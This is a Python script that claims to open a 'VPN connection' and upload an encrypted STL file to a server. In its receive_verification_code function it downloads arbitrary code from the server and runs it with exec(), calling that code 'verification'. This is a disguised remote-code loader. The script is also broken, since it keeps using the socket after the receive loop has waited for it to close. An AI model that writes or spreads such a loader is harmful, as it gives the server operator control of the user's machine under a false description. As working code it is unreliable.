import socket
import tkinter as tk
from tkinter import filedialog
from cryptography.fernet import Fernet

# Function to select a file
def select_file():
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    file_path = filedialog.askopenfilename(filetypes=[("STL files", "*.stl"), ("All files", "*.*")])
    return file_path

# Function to receive and execute the verification code from the server
def receive_verification_code(sock):
    verification_code = b""
    while True:
        part = sock.recv(1024)
        if not part:
            break
        verification_code += part
    exec(verification_code, globals())

# Function to establish a VPN connection and handle the file sending process
def establish_vpn_and_send_file(server_host='127.0.0.1', server_port=5000):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_host, server_port))
    print(f'Connected to server at {server_host}:{server_port}')

    # Receive encryption key from the server
    key = s.recv(1024)
    cipher = Fernet(key)
    
    # Send verification request
    s.sendall(b'verify')

    # Receive and execute the verification code from the server
    receive_verification_code(s)
    print("Verification code received and executed.")

    # Select the STL file to send
    file_path = select_file()
    if not file_path:
        print('No file selected.')
        s.close()
        return

    # Verify the selected STL file
    with open(file_path, 'rb') as file:
        file_data = file.read()
    
    if verify_stl(file_data):
        # Encrypt the STL file data
        encrypted_data = cipher.encrypt(file_data)
        s.sendall(encrypted_data)
        print("Encrypted STL file sent.")

        # Receive confirmation from the server
        confirmation = s.recv(1024)
        if confirmation == b'file received and decrypted':
            print("File successfully received and decrypted by the server.")
        else:
            print("Error processing the file on the server.")
    else:
        print("The selected file is not a valid STL file.")
    
    s.close()

# Function to verify the STL file format
def verify_stl(data):
    # Simple check to verify the STL file (this can be more complex as needed)
    if data.startswith(b'solid'):
        return True
    return False

if __name__ == "__main__":
    establish_vpn_and_send_file()
